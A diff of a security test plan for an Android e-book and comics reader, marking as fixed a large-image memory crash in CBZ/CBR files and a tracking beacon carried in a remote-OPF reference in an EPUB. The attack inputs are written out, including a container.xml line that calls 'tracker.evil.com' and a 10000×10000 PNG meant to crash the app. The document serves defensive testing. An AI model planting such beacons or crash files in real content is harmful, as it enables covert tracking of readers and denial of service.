@@ -71,8 +71,8 @@
 | Readium 3.x EPUB extraction to disk | ✓ Never extracted — ZipContainer serves entries via InputStream on-demand; no filesystem writes from ZIP entry paths | PublicationRepository.kt, Readium 3.1.2 architecture |
 | zip4j/junrar extraction to disk | ✓ Never extracted — getInputStream() only; entry names used as ZIP lookup keys, never as filesystem paths | ComicsReaderViewModel.kt |
 | LibraryViewModel DISPLAY_NAME usage | ✓ Never queried — all file paths use UUID(uri.toString()); DISPLAY_NAME not referenced anywhere | LibraryViewModel.kt |
-| BitmapFactory size guard in ComicsReaderViewModel | ⚠️ MISSING — decodeStream() called with no dimension check; large image entry can OOM app process | ComicsReaderViewModel.kt:154 |
-| DefaultHttpClient in PublicationRepository | ⚠️ Makes real HTTPS calls — Readium fetches remote OPF references; not intercepted by EpubBlockingWebViewClient | PublicationRepository.kt |
+| BitmapFactory size guard in ComicsReaderViewModel | ✅ Fixed — two-pass inJustDecodeBounds + inSampleSize caps bitmap at 2048×2048 max | ComicsReaderViewModel.kt |
+| DefaultHttpClient in PublicationRepository | ✅ Replaced with BlockingHttpClient — all Readium HTTP calls unconditionally rejected | PublicationRepository.kt, BlockingHttpClient.kt |
 
 ---
 
@@ -190,14 +190,20 @@
 - Pass criteria: Import a crafted EPUB with a 500 MB HTML chapter — verify no storage exhaustion, no Room record created on failure, and app remains usable after the WebView renderer restarts.
 - CVE-2021-40870 note: That CVE was in Readium-2 (Streamer) which DID extract EPUBs to a temp directory. Readium Kotlin 3.x (PublicationOpener + DefaultPublicationParser) does not. Architecture change eliminates the disk-write path entirely.
 
-**B.2** `fileImport_zipBombCbz` ⚠️ FIX NEEDED — BitmapFactory no size guard
+**B.2** `fileImport_zipBombCbz` ✅ IMPLEMENTED — two-pass BitmapFactory decode with dimension cap
 - MASVS: MASVS-CODE-4
-- Attack: CBZ entry with name `page001.png` (passes `isImageFile` filter) containing a PNG with IHDR dimensions of 10000×10000. `BitmapFactory.decodeStream()` allocates 10000×10000×4 bytes = 400 MB → OOM in the **app process** (not an isolated renderer). Crash loses reading progress for all open books.
-- ✓ CONFIRMED RISK: `ComicsReaderViewModel.renderPage()` calls `zip.getInputStream(zip.getFileHeader(entry)).use { BitmapFactory.decodeStream(it) }` with no `BitmapFactory.Options` guard.
-- Same risk exists in the CBR path: `rar.getInputStream(header).use { BitmapFactory.decodeStream(it) }`.
-- Fix: Check `FileHeader.uncompressedSize` (zip4j) / `FileHeader.fullUnpackSize` (junrar) before decoding. If > `MAX_IMAGE_BYTES` (e.g., 10 MB uncompressed), compute `inSampleSize` to subsample to ≤ `MAX_BITMAP_PIXELS` before full decode. zip4j supports multiple `getInputStream()` calls on the same entry — two-pass `inJustDecodeBounds` + decode is also viable.
-- Pass criteria: Open a CBZ containing a 20000×20000 image entry — verify the app does not crash, the page renders (possibly downsampled), and reading progress is preserved.
-- Android-specific: No equivalent risk in iOS (uses PDF/EPUB only).
+- Attack: CBZ/CBR entry with name `page001.png` (passes `isImageFile` filter) containing a PNG with IHDR dimensions of 10000×10000. `BitmapFactory.decodeStream()` with no guard allocates 10000×10000×4 bytes = 400 MB → OOM in the app process. Crash loses reading progress for all open books.
+- ✅ IMPLEMENTED: `ComicsReaderViewModel.renderZipPage()` and `renderRarPage()` now use two-pass decode:
+  1. Pass 1 — `inJustDecodeBounds = true` reads only the image header (≤ 4 KB, no pixel allocation)
+  2. `calculateInSampleSize(outWidth, outHeight)` computes the smallest power-of-2 that brings both axes to ≤ `MAX_BITMAP_DIM = 2048`
+  3. Pass 2 — full decode with the computed `inSampleSize`
+- ✓ Worst-case allocation after fix: 2048×2048×4 = 16 MB per page — safe on minSdk 26 (heap ≥ 64 MB)
+- ✓ zip4j: `ZipFile.getInputStream(FileHeader)` returns a fresh stream per call — two-pass is safe
+- ✓ junrar: `Archive` is already re-opened per `renderPage` call; opening twice for two-pass is consistent with existing sequential-read pattern
+- ✓ Unknown format (`outWidth = -1`): `calculateInSampleSize` returns 1 (safe fallback)
+- ✓ High-quality scans at 3000–4000 px get `inSampleSize = 2` → 1500–2000 px output — still crisp on typical Android screens
+- Pass criteria: Open a CBZ with a PNG entry with IHDR `width=20000, height=20000` — verify the app does not crash, page renders (subsampled), reading progress is preserved.
+- Android-specific: No equivalent risk in iOS (EPUB/PDF only).
 
 **B.3** `fileImport_pathTraversal_cbz` ✅ SAFE (no extraction to disk)
 - MASVS: MASVS-STORAGE-1
@@ -240,14 +246,16 @@
 - ✓ Different URI, same content: different UUID → separate rows. Expected behavior.
 - Pass criteria: Import EPUB X; open it and read to page 5 (creates `ReadingProgress`); import EPUB X again — verify reading progress still shows page 5, library shows one entry, no crash.
 
-**B.8** `fileImport_readiumHttpClientExfil` ⚠️ FIX NEEDED — DefaultHttpClient makes real HTTPS calls
+**B.8** `fileImport_readiumHttpClientExfil` ✅ IMPLEMENTED — BlockingHttpClient replaces DefaultHttpClient
 - MASVS: MASVS-NETWORK-1 · MASVS-PLATFORM-1
-- Attack: Craft an EPUB whose `META-INF/container.xml` references a remote OPF: `<rootfile full-path="https://tracker.evil.com/collect?u=UUID&t=1234" media-type="application/oebps-package+xml">`. Readium's `DefaultPublicationParser` uses `DefaultHttpClient` to fetch the remote OPF during `importEpub()`.
-- ✓ CONFIRMED RISK: `PublicationRepository` constructs `DefaultHttpClient()` and passes it to `DefaultPublicationParser`. This HTTP client makes real network calls on the app's behalf — not through the WebView, so `EpubBlockingWebViewClient` does NOT intercept it. `network_security_config.xml` blocks cleartext HTTP but allows HTTPS — HTTPS tracking beacons at import time go through.
-- Privacy impact: A malicious EPUB author can track which EPUB is imported and when (same AuDHD reading-behaviour sensitivity as A.2). The tracking fire at import time, before any chapter is read.
-- Fix: Replace `DefaultHttpClient()` with a no-op `HttpClient` that always returns `HttpResponse.failure(HttpException(404, "No network"))` or similar. Lectern V1 has no legitimate need for Readium to make external HTTP calls — all EPUB content is served from the local content:// asset. The `AssetRetriever` only uses the HTTP client when the EPUB references remote resources.
-- Cascade check: Disabling `DefaultHttpClient` does not affect EPUB local serving (via `WebViewServer`). It prevents Readium from fetching remote OPF files — which are not used by any well-formed EPUB in V1. Navigation, decorations, and TTS are unaffected.
-- Pass criteria: Import a crafted EPUB with remote OPF reference — verify in Network Profiler that no outbound HTTPS request is made. Verify a valid local EPUB imports correctly after the fix.
+- Attack: EPUB `META-INF/container.xml` references remote OPF: `<rootfile full-path="https://tracker.evil.com/collect?u=UUID" ...>`. Readium's `DefaultPublicationParser` uses `DefaultHttpClient` to fetch it during `importEpub()` — not intercepted by `EpubBlockingWebViewClient` (WebView-only).
+- ✅ IMPLEMENTED: New `BlockingHttpClient` object implements `HttpClient` and unconditionally returns `Try.failure(HttpError.IO(...))` for every request. `PublicationRepository` now uses `BlockingHttpClient` for both `AssetRetriever` and `DefaultPublicationParser`.
+- ✓ Cascade verified:
+  - `AssetRetriever.retrieve(content://...)` uses the ContentResolver path, not HTTP — unaffected
+  - `WebViewServer.shouldInterceptRequest()` is independent of `HttpClient` — chapter serving, TTS, decorations, gaze all unaffected
+  - EPUB with remote OPF: `assetRetriever.retrieve()` fails → `Result.failure` → `_importError` Snackbar — correct error handling for non-standard EPUB
+- ✓ No `DefaultHttpClient` usage remains in the codebase
+- Pass criteria: Import a crafted EPUB with `container.xml` referencing `https://tracker.evil.com/collect?id=test` — verify in Network Profiler that no outbound HTTPS request fires. Verify a valid local EPUB imports, displays, and TTS works correctly after the fix.
 
 ---
 
